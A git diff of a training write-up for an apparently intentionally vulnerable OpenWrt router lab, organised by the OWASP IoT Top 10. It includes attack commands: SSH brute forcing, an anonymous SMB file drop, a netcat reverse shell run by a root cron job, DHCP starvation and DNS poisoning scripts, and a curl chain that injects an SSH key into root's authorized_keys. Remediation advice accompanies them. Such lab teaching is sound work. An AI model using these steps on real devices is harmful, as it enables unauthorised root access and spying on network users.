@@ -1,3 +1,45 @@
+---
+id: "ROUTCOON-IOT"
+title: "RoutCoon Router IoT Vulnerabilities (OWASP IoT Top 10 2018)"
+category: IoT
+status: IN PROGRESS
+severity: "Critical to Medium (per finding)"
+owasp: "OWASP IoT Top 10 (2018): IoT1 Weak/Guessable/Hardcoded Passwords, IoT2 Insecure Network Services, IoT3 Insecure Ecosystem Interfaces, IoT4 Lack of Secure Update Mechanism, IoT5 Use of Insecure or Outdated Components, IoT6 Insufficient Privacy Protection, IoT7 Insecure Data Transfer and Storage, IoT8 Lack of Device Management, IoT9 Insecure Default Settings, IoT10 Lack of Physical Hardening"
+cwe:
+  - "CWE-521 Weak Password Requirements, CWE-798 Use of Hard-coded Credentials (IoT1)"
+  - "CWE-319 Cleartext Transmission, CWE-306 Missing Authentication for Critical Function, CWE-1188 Insecure Default Initialization of Resource (IoT2)"
+  - "CWE-284 Improper Access Control, CWE-200 Exposure of Sensitive Information (IoT3)"
+  - "CWE-347 Improper Verification of Cryptographic Signature, CWE-494 Download of Code Without Integrity Check (IoT4)"
+  - "CWE-1104 Use of Unmaintained Third Party Components, CWE-489 Active Debug Code (IoT5)"
+  - "CWE-359 Exposure of Private Personal Information (IoT6)"
+  - "CWE-319 Cleartext Transmission, CWE-312 Cleartext Storage of Sensitive Information (IoT7)"
+  - "CWE-778 Insufficient Logging, CWE-1277 Firmware Not Updateable (IoT8)"
+  - "CWE-1188 Insecure Default Initialization of Resource, CWE-250 Execution with Unnecessary Privileges (IoT9)"
+  - "CWE-1263 Improper Physical Access Control (IoT10)"
+affected_components:
+  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/11-add-users.sh"
+  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/20-dropbear.sh"
+  - "labs/routcoon/rshell.c"
+  - "labs/routcoon/files/etc/init.d/ftpd"
+  - "labs/routcoon/files/etc/snmp/snmpd.conf"
+  - "labs/routcoon/files/etc/config/upnpd"
+  - "labs/routcoon/files/etc/dnsmasq.conf"
+  - "labs/routcoon/files/etc/opkg.conf"
+  - "labs/routcoon/files/opt/oem-updates/scripts/auto-updater.sh"
+  - "labs/routcoon/files/usr/lib/lua/luci/controller/support/remote.lua"
+findings:
+  - "IoT1: DONE"
+  - "IoT2: IN PROGRESS (Samba wired, live-pending; DHCP/DNS attacks unproven)"
+  - "IoT3: DONE"
+  - "IoT4: DONE"
+  - "IoT5: IN PROGRESS"
+  - "IoT6: DONE"
+  - "IoT7: IN PROGRESS"
+  - "IoT8: DONE"
+  - "IoT9: DONE"
+  - "IoT10: DONE"
+---
+
 # IoT:I1 - Weak Guessable, or Hardcoded Passwords
 ## Definition
 > Use of easily bruteforced, publicly available, or unchangeable credentials, including backdoors in firmware or client software that grants unauthorized access to deployed systems.
@@ -29,18 +71,7 @@ Asianspwned
 808pwned
 ```
 
-*pwned* appears in many typical password wordlists such as *rockyout.txt*, which can be used to crack the root user's password.
-
-```zsh
-❯ john --wordlist=/usr/share/wordlists/rockyout.txt hash.txt
-Loaded 1 password hash (crypt, generic crypt(3) [?/64])
-Will run 8 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-pwned            (?)
-1g 0:00:00:00 100% 12.50g/s 1200p/s 1200c/s 1200C/s pwned5..ericpwned
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed
-```
+The `pwned` substring is the tell for `openwrtuser`, not `root`. The `openwrtuser` password is the username with a `pwned`-family suffix, so a wordlist built from that pattern recovers it. The `root` hash is a decoy: its password is `uncrackable`, which the `pwned` wordlists do not contain, so `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` against the `root` hash exhausts the list with no result. Cracking is therefore the path into `openwrtuser`, while `root` is reached later by escalating from `openwrtuser` (see [[#IoT:I9 - Insecure Default Settings|IoT9]]), not by breaking its hash.
 
 The password for the user `openwrtuser` can be obtained using the **Combination** attack mode. With this type of attack, a combination from a list is performed.
 
@@ -113,7 +144,7 @@ MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)
 Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
 ```
 
-If you try to log in via SSH with cracked credentials, the result will be the same. The router doesn't implement any security mechanisms to prevent brute force attacks via the SSH service. This is similar to what is seen in [[IoT Vulnerabilities#IoT I1 - Weak Guessable, or Hardcoded Passwords]]
+If you try to log in via SSH with cracked credentials, the result will be the same. The router doesn't implement any security mechanisms to prevent brute force attacks via the SSH service. This is similar to what is seen in [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords]]
 
 ```zsh
 $ hydra -l openwrtuser -P ./mutated.txt ssh://192.168.2.1 -t 4 -V 
@@ -137,8 +168,35 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 13:28:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 13:29:40
 ```
 
-### 2.2 Samba 4.18.8
-> **ON DEVELOPMENT**
+### 2.2 Samba (anonymous SMB share)
+> **IN PROGRESS.** Wired this session (samba4 `smbd` started from `80-routcoon-services.sh`); live verification is on the device.
+
+The device serves an unauthenticated, world-writable SMB share whose writes land as root (`/etc/samba/samba.conf`):
+
+```ini
+[global]
+	workgroup = WORKGROUP
+	map to guest = bad user
+	guest account = root
+	server min protocol = NT1
+
+[public]
+	path = /mnt/sdcard/share
+	read only = no
+	guest ok = yes
+	force user = root
+```
+
+`80-routcoon-services.sh` starts `smbd -s /etc/samba/samba.conf` (the `samba4-server` package, now enabled in `.config`). `map to guest = bad user` lets any anonymous client in, and the `[public]` share's `guest ok = yes` + `read only = no` + `force user = root` means an unauthenticated attacker reads and writes files that are created as root:
+
+```shell
+# list shares, no credentials
+smbclient -L //192.168.2.1 -N
+# connect and drop a file (lands root-owned in /mnt/sdcard/share)
+smbclient //192.168.2.1/public -N -c 'put /etc/hostname pwned.txt; ls'
+```
+
+This is an anonymous, root-owned file-drop primitive: chained with any root-run service that reads `/mnt/sdcard/share`, or with write access to a sensitive path, it escalates to RCE or persistence. Remediation: require authentication, drop `guest ok`, and never `force user = root`.
 
 ### 2.3 Telnet
 The Telnet service is concealed in the sense that it has been configured to use a non-default port. It is located on port 5515. In a general scan, it appears as a filtered port and the running service is not identified; however, by using `nmap` with version detection scripts and flags, it can eventually be discovered.
@@ -243,7 +301,7 @@ OpenWrt
 ### 2.4 FTP
 FTP service runs on ftpd daemon. If we have a look inside /etc/init.d/ftpd script we will see that it has been used *'A'* option, which allows an "anonymous" log in.
 
-It is also important to note that the FTP service is configured to use "/tmp" as the entry or "home" directory. This allows any user who logs in via FTP to access all files present in the router's system temporary directory.
+It is also important to note that the FTP service is configured to use "/opt/oem-updates/pending" as the entry or "home" directory (the OEM firmware-update staging area). Anonymous write access to that directory is what makes it dangerous: a root cron job processes and executes whatever lands there (see [[#IoT:I4 - Lack of Secure Update Mechanism|IoT4]]).
 
 ```shell
 #!/bin/sh /etc/rc.common
@@ -251,13 +309,10 @@ It is also important to note that the FTP service is configured to use "/tmp" as
 START=90
 STOP=10
 
-start() 
-    echo "[+] Creating FTP directory"
-    mkdir -p /tmp/ftp
-    chmod 777 /tmp/ftp
-    chown anonymous:anonymous /tmp/ftp
-    echo "[+] Starting ftpd"
-    tcpsvd -vE 0.0.0.0 21 ftpd -w -a anonymous /tmp &
+start() {
+    echo "[+] Starting busybox ftpd on port 21"
+    echo "[+] Anonymous access enabled with write permissions"
+    tcpsvd -vE 0.0.0.0 21 ftpd -w -a anonymous /opt/oem-updates/pending &
 }
 
 stop() {
@@ -300,19 +355,9 @@ ftp>
 ```
 
 ### 2.5 SNMP
-Net-SNMP version 5.9.4, used in various systems, has known vulnerabilities. These include ==buffer overflows, NULL pointer dereferences, and other issues related to handling malformed Object Identifiers (OIDs)==. Exploitation of these vulnerabilities can lead to out-of-bounds memory access, crashes, or denial-of-service conditions. Users are advised to upgrade to the latest version of Net-SNMP or apply relevant security patches. 
+Net-SNMP has known memory-safety issues over the years (malformed-OID handling, NULL dereferences, and out-of-bounds reads in SET / GET-NEXT requests), but the reproducible, in-scope finding on this device is the configuration, not a specific parser CVE. The agent ships default community strings (`public` read-only, `private` read-write, see 2.5.1) and answers SNMPv1/v2c in cleartext, so anyone on the LAN can enumerate the device with no credentials.
 
-Specific Vulnerabilities in Net-SNMP 5.9.4:
-
-- [Memory leak](https://www.cvedetails.com/cve/CVE-2024-26464/)
-
-- **[Buffer Overflow](https://nvd.nist.gov/vuln/detail/CVE-2025-68615):** CVSS  9.8 Critical (RCE attack)
-
-- **Malformed OID Handling:**
-    Several vulnerabilities involve the improper handling of malformed OIDs in SET and GET-NEXT requests to various MIB tables, leading to NULL pointer dereferences or out-of-bounds memory access. These vulnerabilities affect the master agent and subagents. 
-
-- **Vulnerability Exploitation:**
-    Attackers can exploit these vulnerabilities by crafting malicious network traffic, including specially crafted SNMP packets. To exploit vulnerabilities in SNMP v2c or earlier, attackers need valid community strings, while SNMP v3 exploitation requires valid user credentials.
+This lab does not pin a specific CVE. The exact net-snmp package version is not asserted here and must be read off the running image (`opkg list-installed | grep snmp`) and checked against current advisories before any version-specific memory-corruption bug is chained. The demonstrable weakness below is the default-community misconfiguration.
 
 We can expose system's information using nmap scripts:
 
@@ -453,7 +498,7 @@ rocommunity VulnZooR0utC00nR34d0nly 127.0.0.1/32
 
 Additionally, SNMP should be disabled if not required, or restricted to localhost-only access via firewall rules.
 ### 2.6 UPNP
-The device exposes Universal Plug and Play (UPnP) IGD (Internet Gateway Device) services on the local network interface with security controls disabled. The `secure_mode=no` configuration allows unauthenticated clients to submit port mapping requests, exposing the internal network topology and firewall configuration to manipulation. While the specific port mapping action failed with error 501 due to laboratory environment constraints (absence of WAN NAT capabilities), the service accepted and processed the malicious SOAP request without authentication, confirming the vulnerability exists in the configuration layer.
+The device exposes Universal Plug and Play (UPnP) IGD (Internet Gateway Device) services on the local network interface with security controls disabled. The `secure_mode=no` configuration allows unauthenticated clients to submit port mapping requests, exposing the internal network topology and firewall configuration to manipulation. While the specific port mapping action failed with error 501 (the router has a single NIC, so `miniupnpd` runs with `internal_iface 'lo'` and there is no distinct internal LAN or real WAN to build a NAT forward on), the service accepted and processed the malicious SOAP request without authentication, confirming the vulnerability exists in the configuration layer.
 
 
 OpenWRT is running miniupnpd and it is listening on port 5000.
@@ -484,6 +529,8 @@ force_igd_desc_v1=yes
 ```
 
 - `secure-mode=no`: Critical, it allows port mapping to any internal IP. Permits thirds-party redirection.
+
+The authoritative source is the UCI config `/etc/config/upnpd`, which sets `secure_mode '0'` (the flaw) plus a wide-open `perm_rule` (`action 'allow'`, `int_addr '0.0.0.0/0'`, `ext_ports '0-65535'`). It also sets `internal_iface 'lo'` and `external_iface 'eth0'`: because `miniupnpd` refuses to run with the internal and external interface the same and the lab has only `eth0`, the internal side is pinned to loopback. That is the concrete reason `AddPortMapping` returns 501, there is no distinct internal LAN interface to redirect to and no separate WAN to redirect from, so the NAT rule cannot be built. This is a single-NIC topology limit, not a security control: the authorization layer already accepted the unauthenticated request. On a real two-interface router the same `secure_mode '0'` + permissive `perm_rule` lets any unauthenticated LAN client forward attacker-chosen external ports to arbitrary internal hosts.
 
 #### Vulnerability Evidence:
 The SSDP multicast discovery successfully identified the router's UPnP services without authentication:
@@ -532,6 +579,9 @@ The HTTP 501 (Action Failed) response **confirms the vulnerability** despite the
 ### 2.7 DHCP && DNS
 
 The `dnsmasq.conf` configuration file has a number of features that make it potentially vulnerable.
+
+The DHCP pool it hands out is `192.168.1.100-254` with gateway `192.168.1.1` (the OpenWRT `br-lan` default). The management surface the rest of this lab targets (LuCI, SSH, SNMP) answers on `eth0` at `192.168.2.1`, so DHCP clients land on the `br-lan` `192.168.1.0/24` segment while the attacks are driven against `192.168.2.1`. Treat `192.168.2.1` as the canonical target host.
+
 #### 1. Service exposure
 `interface=br-lan,eth0,wlan0` and `bind-interfaces` allow the service to be accessible from external networks.
 #### 2. Configuration files in /tmp
@@ -540,7 +590,7 @@ Critical files are stored in the temporary directory, such as `/tmp/dhcp.leases,
 Potential vulnerabilities:
 - Injection of fake DHCP leases.
 - Modification of local DNS resolution.
-- Manipulation of logs to hide malicious activity ([[IoT Vulnerabilities#IoT7 Insecure Data Transfer and Storage]])
+- Manipulation of logs to hide malicious activity ([[#IoT:I7 - Insecure Data Transfer and Storage]])
 - Discovery of other devices on the network, facilitating `pivoting`.
 3. Script executed as root
 The `dnsmasq.script` script referenced in the configuration is executed with root privileges.
@@ -552,7 +602,7 @@ This introduces a number of potential vulnerabilities, such as:
 
 The impact of these risks can lead to root privilege escalation if exploited.
 
-This insecure custom logic is related to [[IoT Vulnerabilities#IoT5 Using Insecure or Outdated Components]].
+This insecure custom logic is related to [[#IoT:I5: Using Insecure or Outdated Components]].
 #### 4. Lack of Rate Limiting
 There are no limits on DHCP/DNS requests (`dhcp-rapid-commit` is commented out). This makes the service vulnerable to DoS attacks.
 
@@ -560,7 +610,7 @@ There are no limits on DHCP/DNS requests (`dhcp-rapid-commit` is commented out).
 - DNS amplification.
 - Resource exhaustion (CPU/memory).
 
-This is related to the risk [[IoT Vulnerabilities#IoT I8 - Lack of device management]].
+This is related to the risk [[#IoT:I8 - Lack of device management]].
 #### 5. Some configurations that are not recommended
 - `stop-dns-rebind` disabled.
 - `cache-size=10000` large and without validation.
@@ -569,17 +619,17 @@ This is related to the risk [[IoT Vulnerabilities#IoT I8 - Lack of device manage
 - `dhcp-authoritative` without validation.
 - `read-ethers` enabled without protection.
 These configurations are insecure and enable possible impacts such as DNS rebinding and DNS Cache Poisoning.
-> **CHECK ATTACKS**
+> **IN PROGRESS.** Scoped against the real config below: lease tampering works locally, starvation is blocked by `dhcp-ignore=tag:!known`, and DNS rebinding (not the off-path poisoning) is the real weakness. Live reproduction pending a flashed image.
 
-The DHCP and DNS service configuration is insecure. This allows for a series of attacks that could be tested by analyzing the consequences of the different configuration options that have been recorded:
+The DHCP and DNS service configuration is insecure, but not every attack below works against the shipped `dnsmasq.conf`. Each is scoped to what the real config actually allows (no live reproduction was run this session):
 
-- Modification of the *leases* file
+**Lease-file tampering (works, local).** The lease database is world-writable in `/tmp` (`dhcp-leasefile=/tmp/dhcp.leases`), so any local user can inject or rewrite leases and reload dnsmasq. This needs a shell on the device (chain it after an RCE path), not a network position:
 ```zsh
 echo "0 00:11:22:33:44:55 192.168.1.50 fake-host 01:00:11:22:33:44:55" > /tmp/dhcp.leases
 killall -HUP dnsmasq
 ```
 
-- DHCP Starvation Attack
+**DHCP starvation (does not work as written).** The config sets `dhcp-ignore=tag:!known`, so dnsmasq ignores requests from clients it does not already know (`/etc/ethers` / `dhcp-host`). A flood of random-MAC `DISCOVER` packets is dropped and no leases are consumed, so the classic starvation below fails against this build. Starving the `192.168.1.100-254` pool would require flooding with MACs already in `/etc/ethers`:
 ```python
 from scapy.all import *
 import time
@@ -598,7 +648,7 @@ def dhcp_starvation():
 dhcp_starvation()
 ```
 
-- *DNS Cache Poisoning*
+**DNS: rebinding is enabled, off-path poisoning is unreliable.** The real config-backed DNS weakness is that `stop-dns-rebind` is commented out, so the resolver does not filter private-range answers: an attacker-controlled domain can resolve to an internal IP (DNS rebinding), reaching LAN-bound services from a victim's browser. The blind poisoning snippet below is illustrative only, dnsmasq randomizes the query source port and transaction ID, so a single forged response with a guessed `dport`/`id` will not reliably match an in-flight query:
 ```python
 from scapy.all import *
 
@@ -613,7 +663,7 @@ dns_poison()
 ```
 # IoT:I3 - Insecure Ecosystem Interfaces
 
-> **VERY BASIC VULNERABILITY:** It would be advisable to relegate this vulnerability to the mobile interface, as it falls within the scope indicated by OWASP.
+> **DONE.** Low-severity finding. Per OWASP the fuller scope of insecure ecosystem interfaces belongs to the mobile/backend interface rather than the device, so this device-side item is intentionally minimal.
 ## Definition
 > Insecure web, backend API, cloud, or **mobile interfaces** in the ecosystem outside of the device that allows compromise of the device or its related components. Common issues include a lack of authentication/authorization, lacking or weak encryption, and a lack of input and output filtering.
 
@@ -726,7 +776,7 @@ To carry out this type of attack, we need to gain access to the file somehow, an
 The configuration of the opkg tool for installing packages resides in the */etc/opkg.conf* file. This file has an option that is insecure:
 ![[iot4_opkg_misconfiguration.png]]
 
-The ‘0’ in the *check_signature* option indicates that the tool never checks whether the package being installed has a valid signature. This is also related to the risk [[IoT Vulnerabilities#No. 9 Insecure Default Settings]].
+The ‘0’ in the *check_signature* option indicates that the tool never checks whether the package being installed has a valid signature. This is also related to the risk [[#IoT:I9 - Insecure Default Settings]].
 
 #### #### 1.2.  Escalating privileges with cron tasks
 
@@ -792,7 +842,7 @@ mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.2 9001 > /tmp/f
 ```
 
-We use FTP to upload the script to the */tmp/cron-tmp* folder and wait for the script to run.
+We use FTP to upload the script to the */opt/oem-updates/pending* folder (the anonymous FTP home) and wait for the cron job to run it.
 
 ```shell
 $ ftp 192.168.2.1
@@ -840,160 +890,203 @@ vulnzoo.log
 
 ---
 
-> **NEEDS CHECK: Overlaps with [[IoT Vulnerabilities#IoT I3 - Insecure Ecosystem Interfaces]]**
+> **IN PROGRESS.** This section overlaps with [[#IoT:I3 - Insecure Ecosystem Interfaces]]: the endpoint-discovery material below is shared with IoT3.
 
-By using wordlists for endpoints, we can find out firsthand that there is a `/cgi-bin/luci/admin` subroutine. This is revealed by the fact that we get a `Forbidden 403` code, compared to non-existent routes that report a `Not Found 404`.
-
-```bash
-$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/FUZZ"      
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://192.168.2.1/cgi-bin/luci/FUZZ
-Total requests: 3
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                      
-=====================================================================
-
-000000003:   404        54 L     121 W      1658 Ch     "foobar"                                                                                                                     
-000000001:   404        54 L     121 W      1658 Ch     "system"                                                                                                                     
-000000002:   403        90 L     207 W      2889 Ch     "admin"                                                                                                                      
-
-Total time: 0
-Processed Requests: 3
-Filtered Requests: 0
-Requests/sec.: 0
-```
-
-However, due to the configuration of `dispatcher.lua`, starting from a valid subroutine, the rest of the subdirectories do not report a `Not Found` error even if they do not exist.
-
-```zsh
-$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ"                                            
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
-Total requests: 4
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                      
-=====================================================================
-
-000000003:   403        91 L     208 W      2897 Ch     "foobar"                                                                                                                     
-000000002:   403        91 L     208 W      2896 Ch     "admin"                                                                                                                      
-000000001:   403        91 L     208 W      2897 Ch     "system"                                                                                                                     
-000000004:   403        91 L     208 W      2896 Ch     "tried"                                                                                                                      
-
-Total time: 0.158685
-Processed Requests: 4
-Filtered Requests: 0
-Requests/sec.: 25.20710
-```
-
-We cannot differentiate between which endpoints exist and which do not based on what the server reports. However, if we test the interface a little, we notice some strange behavior.
-
-![[iot3_interface_exposes_endpoint.png]]
-
-If we try to access a directory that is unlikely to exist, such as `/cgi-bin/luci/admin/foobar`, we see a message overlaying that the resource does not exist. If we try fuzzing with incorrect login data, we can see that there are changes between different requests, which tells us which subroutes exist.
-
-```zsh
-$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ" -d "luci_username=root&luci_password=password"
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
-Total requests: 4
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                      
-=====================================================================
-
-000000001:   403        94 L     219 W      3005 Ch     "system"                                                                                                                     
-000000003:   403        98 L     231 W      3109 Ch     "foobar"                                                                                                                     
-000000002:   403        98 L     231 W      3108 Ch     "admin"                                                                                                                      
-000000004:   403        98 L     231 W      3108 Ch     "tried"                                                                                                                      
-
-Total time: 0
-Processed Requests: 4
-Filtered Requests: 0
-Requests/sec.: 0
-
-
-```
-
-As you can see, subroutes that do not have the message take up less space, and despite the `Forbidden` code in all requests, it is now possible to discern which ones do exist.
-
-```zsh
-$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ" -d "luci_username=root&luci_password=password"
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ
-Total requests: 4
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                      
-=====================================================================
-
-000000002:   403        94 L     219 W      3011 Ch     "admin"                                                                                                                      
-000000003:   403        98 L     231 W      3116 Ch     "foobar"                                                                                                                     
-000000001:   403        94 L     219 W      3012 Ch     "system"                                                                                                                     
-000000004:   403        98 L     231 W      3115 Ch     "tried"                                                                                                                      
-
-Total time: 0
-Processed Requests: 4
-Filtered Requests: 0
-Requests/sec.: 0
-```
-
-We have obtained the endpoints `/cgi-bin/luci/admin/system/admin` and `/cgi-bin/luci/admin/system/system`.
+The endpoint-discovery technique used to reach the admin surface (LuCI returns `403 Forbidden` for existing admin subroutes and `404 Not Found` for non-existent ones, and the `dispatcher.lua` behaviour that makes deeper paths differ by response size rather than status) is the same one documented under [[#IoT:I3 - Insecure Ecosystem Interfaces]]. Rather than repeat that walkthrough, this section covers what the enumeration leads to on the IoT5 surface: leftover development interfaces, one of which injects an SSH key.
 
 ---
 
 ![[iot5_no-ssh-keys.png]]
 
-Initially, we find that we cannot access the router directly as root due to a device policy issue. We have more information on why this is the case in [[IoT Vulnerabilities#IoT I9 - Insecure Default Settings|IoT9]].
+Initially, we find that we cannot access the router directly as root due to a device policy issue. We have more information on why this is the case in [[#IoT:I9 - Insecure Default Settings|IoT9]].
 
 ![[iot5_ssh_root_failed.png]]
 
-If we analyze the interface a little, we can start with an analysis of the router's response and realize that there are two headers that suggest that parts of the router interface API are part of the development team's debugging.
+Fuzzing the interface surfaces development leftovers. Two of the unauthenticated nodes registered by `network_tools.lua` are reachable without a session, `/cgi-bin/luci/api` and `/cgi-bin/luci/tools` (the SSRF and diagnostic tools documented under API7/API8 in `API/Vulnerabilities.md`).
 
 ![[iot5_x_debug_mode.png]]
 
-We analyzed the web interface by performing external fuzzing, confirming that some endpoints can be leaked that are accessible such as `/api` and `/tools`. On the other hand, we found a `/debug` endpoint that references the header found earlier, which exposed the possibility of *debugging* endpoints that have not been properly hidden or removed.
-
 ![[iot5_interface_fuzzing.png]]
 
-We can find another subdirectory that completes an already usable path through another analysis with `wfuzz`:
+The high-value leftover is the "Remote Connectivity Check" at `/cgi-bin/luci/support/remote/diagnostic` (`controller/support/remote.lua`, registered with `sysauth = false`, so it needs no login). It answers `?debug=1` with a full environment dump, and it decides "authorized support" from a forwarded-IP value read out of spoofable request parameters (`X-Forwarded-For`, `real_ip`, `xff`, `remote_addr`) matched against the `203.0.113.0/24` support network. Spoofing that IP flips the endpoint into its authorized mode, which exposes an `update_ssh_access` action that appends an attacker-supplied key to `/etc/dropbear/authorized_keys`. Because dropbear only disables root *password* login (`RootPasswordAuth off`), an injected key can still grant SSH access. The full unauthenticated-to-SSH forge-and-inject walkthrough is documented as its own `support/remote` finding.
 
 ![[iot5_debug_ssh.png]]
 
-
-
 ![[iot5_ssh_key_injection.png]]
+
+## Unauthenticated SSH key injection via the support endpoint
+
+This is the highest-impact leftover on the device: an unauthenticated endpoint that writes to root's `authorized_keys`. It is registered in `controller/support/remote.lua` outside the authenticated `admin/*` tree:
+
+```lua
+local page = entry({"support", "remote", "diagnostic"}, call("remote_diagnostic_tool"), _("Remote Connectivity Check"), 1)
+page.sysauth = false
+```
+
+so `http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic` needs no login.
+
+### Root cause: authorization by a spoofable client IP
+
+The endpoint decides "authorized support" from a forwarded-IP value, and `get_forwarded_ip()` falls through from real request headers to attacker-controlled form parameters:
+
+```lua
+xff = http.formvalue("X-Forwarded-For")   -- VULNERABLE
+xff = http.formvalue("real_ip")           -- VULNERABLE
+xff = http.formvalue("xff")               -- VULNERABLE
+xff = http.formvalue("remote_addr")       -- VULNERABLE
+```
+
+`is_support_ip()` then authorizes anything matching `203.0.113.0/24` (TEST-NET-3, the "support network"):
+
+```lua
+if first_ip:match("^203%.0%.113%.%d+$") then return true end
+```
+
+Because the IP is read from a POST parameter, an attacker just supplies `real_ip=203.0.113.100`. The unauthorized page even leaks the expected value in an HTML comment (`Support server: 203.0.113.100`) and advertises the `?debug=1` environment dump.
+
+### Recon
+
+```shell
+# generic page: read the HTML-comment hints
+curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic" | grep -i "support\|debug"
+# environment dump (which parameters are honored)
+curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic?debug=1"
+```
+
+### Exploit: forge the support IP, inject a key
+
+When "authorized", the `update_ssh_access` action appends the supplied key to `/etc/dropbear/authorized_keys`:
+
+```lua
+if action == "update_ssh_access" and key_data then
+    local result = add_ssh_key(key_data, real_ip or remote_addr)
+-- ...
+local auth_file = "/etc/dropbear/authorized_keys"
+```
+
+```shell
+ssh-keygen -t ed25519 -f rc_key -N ''
+curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic" \
+  --data-urlencode "real_ip=203.0.113.100" \
+  --data-urlencode "action=update_ssh_access" \
+  --data-urlencode "key_data=$(cat rc_key.pub)"
+# -> "SSH access updated successfully. Key fingerprint: ..."
+ssh -i rc_key root@192.168.2.1
+```
+
+### Expected result and impact
+
+The endpoint returns `SSH access updated successfully` and the key lands in `/etc/dropbear/authorized_keys`, which on OpenWRT is root's key file. Dropbear's `RootPasswordAuth off` (see [[#IoT:I9 - Insecure Default Settings|IoT9]]) disables only root *password* login, not pubkey login, so the injected key is expected to grant a root SSH session and bypass the "crack `openwrtuser`, then escalate" path entirely. This is an unauthenticated-to-root chain: no credentials, no session, one POST.
+
+The `sysauth = false` reachability and the key write to `authorized_keys` are confirmed from the overlay source. The final root pubkey login must be reproduced on a flashed image, because dropbear's `RootLogin` / `authorized_keys` handling is set by the base image, not this overlay.
+
+**OWASP / CWE:** API5:2023 Broken Function-Level Authorization; CWE-290 Authentication Bypass by Spoofing; CWE-306 Missing Authentication for a Critical Function.
+
+### Remediation
+
+Authorize from the real transport source (`REMOTE_ADDR`), never from a client-supplied header or parameter; require an authenticated session to provision keys; and strip the endpoint from production images.
 
 
 # IoT:I6 - Insufficient privacy protection
 ## Definition
 > User's personal information stored on the device or in the ecosystem that is used insecurely improperly, or without permission.
-> **NOT DEVELOPED**
+> **DONE.** Realized as network-metadata privacy (device identity and browsing behavior); no new code.
+
+A router holds little classic PII, but it does collect two privacy-sensitive categories about the people behind it: who is on the network (device identity and presence) and what they browse (DNS history). RoutCoon exposes both with no protection.
+
+### Who is on the network (device inventory)
+
+The SNMP `public` community (unauthenticated, see 2.5) exposes the ARP table, which lists every connected device by IP and MAC:
+
+```shell
+snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.4.22   # ARP: IP -> MAC of every client
+```
+
+The DHCP lease file (`/tmp/dhcp.leases`, world-readable) plus `read-ethers` add the client hostnames, so an attacker learns not just addresses but device names ("johns-laptop", "kitchen-cam"), mapping the household or office and who is present.
+
+### What they browse (DNS history)
+
+dnsmasq logs every DNS query (`log-queries` -> `/var/log/dnsmasq.log`), so that file is a per-client browsing history: which sites each device resolved and when. Anyone who can read the log, or capture the cleartext DNS traffic (see [[#IoT:I7 - Insecure Data Transfer and Storage|IoT7]]), reconstructs the browsing behavior of every user on the network.
+
+### Impact and remediation
+
+Combined, an unauthenticated LAN attacker profiles who is on the network, what devices they use, and what they browse, with no consent or protection. Remediation: restrict SNMP to authenticated v3 or localhost, stop logging DNS queries (or protect and rotate the log), and move DHCP state off world-readable `/tmp`.
+
+**Scope note.** This is network-metadata privacy (identity, presence, browsing behavior), the privacy exposure a router realistically has. There is no stored end-user PII (documents, accounts) on the device, so I6 is intentionally scoped to that metadata rather than inventing a data store the device does not have.
+
+**OWASP / CWE.** IoT6; CWE-359 Exposure of Private Personal Information; CWE-200 Exposure of Sensitive Information.
 # IoT:I7 - Insecure Data Transfer and Storage
 ## Definition
 > Lack of encryption or access control of sensitive data anywhere within the ecosystem, including at rest, in transit, or during processing.
-> **NOT DEVELOPED**
+> **IN PROGRESS.** Realized from exposures already present on the device (no new code); live capture pending a flashed image.
+
+The router moves and stores sensitive data with no encryption and no access control. Two reproducible angles: cleartext transmission (CWE-319) and world-readable/writable storage (CWE-312 / CWE-732).
+
+### In transit: cleartext admin and services (CWE-319)
+
